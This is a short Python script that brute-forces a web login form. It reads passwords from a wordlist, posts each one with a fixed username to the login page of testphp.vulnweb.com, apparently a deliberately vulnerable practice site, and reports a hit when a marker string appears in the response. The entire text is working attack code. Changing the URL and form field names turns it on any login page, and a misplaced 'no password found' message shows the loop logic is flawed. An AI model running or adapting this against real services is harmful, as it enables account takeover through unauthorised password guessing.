import requests
import sys

target = "http://testphp.vulnweb.com/userinfo.php"
usernames = ["test"]
wordlist_path = "test.txt"
needle = "(test)"

for user in usernames:
	with open(wordlist_path, "r") as words:
		for word in words:
			word = word.strip('\n')
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(user, word))
			sys.stdout.flush()
			r = requests.post(target, data = {"uname": user, "pass": word})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'!".format(word, user))
				sys.exit()
			sys.stdout.flush()
			sys.stdout.write("\n")
			sys.stdout.write("\tNo password found for {}".format(user))
			sys.stdout.write("\n")